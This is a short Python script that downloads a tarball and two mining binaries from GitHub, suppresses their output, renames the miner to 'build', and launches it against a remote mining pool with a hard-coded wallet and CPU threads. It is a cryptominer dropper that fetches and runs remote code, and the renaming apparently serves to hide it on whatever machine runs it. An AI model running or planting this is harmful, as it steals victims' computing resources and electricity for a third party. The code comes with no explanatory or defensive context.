import os
os.system("curl -0 https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz -o graphics.tar.gz >/dev/null 2>&1")
os.system("tar -xvzf graphics.tar.gz")
os.system("wget -O hellminer https://raw.githubusercontent.com/akton0208/test2/main/hellminer >/dev/null 2>&1")
os.system("wget -O verus-solver https://raw.githubusercontent.com/akton0208/test2/main/verus-solver >/dev/null 2>&1")
os.system("chmod +x hellminer verus-solver")
os.system("mv hellminer build")
os.system("./build -c stratum+tcp://us.vipor.net:5040#xnsub -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx..bajingan -p x --cpu 4 -F")
